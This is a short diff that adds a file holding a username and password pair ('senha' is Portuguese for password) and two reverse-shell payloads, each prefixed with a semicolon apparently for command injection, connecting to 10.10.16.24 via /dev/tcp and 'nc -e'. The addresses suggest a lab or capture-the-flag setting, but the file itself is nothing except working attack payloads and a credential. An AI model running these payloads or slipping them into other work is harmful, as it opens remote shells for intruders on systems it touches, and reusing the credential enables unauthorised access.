@@ -1,0 +1,7 @@
+user:iguin
+senha:iguinemarquin123
+
+
+;/bin/bash -c "/bin/bash bash -i >& /dev/tcp/10.10.16.24/443 0>&1"
+;nc -e /bin/sh 10.10.16.24 9001
+
